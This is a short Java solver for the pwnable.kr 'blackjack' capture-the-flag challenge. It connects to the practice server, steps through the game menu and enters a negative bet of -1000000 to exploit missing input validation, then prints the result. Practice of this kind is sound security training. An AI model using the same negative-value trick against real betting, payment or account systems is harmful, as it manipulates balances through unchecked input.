package pwnablekr;

import static connection.Connection.remote;

import connection.Connection;

public class BlackJack {

	
	public static void main(String[] args) {
		Connection blackJack = remote("pwnable.kr", 9009);
		
		blackJack.readUntil("(Y/N)");
		blackJack.sendln("Y");
		
		blackJack.readUntil("Choice: ");
		blackJack.sendln("1");
		
		blackJack.readUntil("Enter Bet: $");
		blackJack.sendln("-1000000");
		
		blackJack.readUntil("Please Enter H to Hit or S to Stay.");
		blackJack.sendln("S");
		
		blackJack.readUntil("Please Enter Y for Yes or N for No\n");
		blackJack.sendln("Y");
		
		System.out.println(blackJack.readln());
		
		blackJack.close();
	}
	
	
}
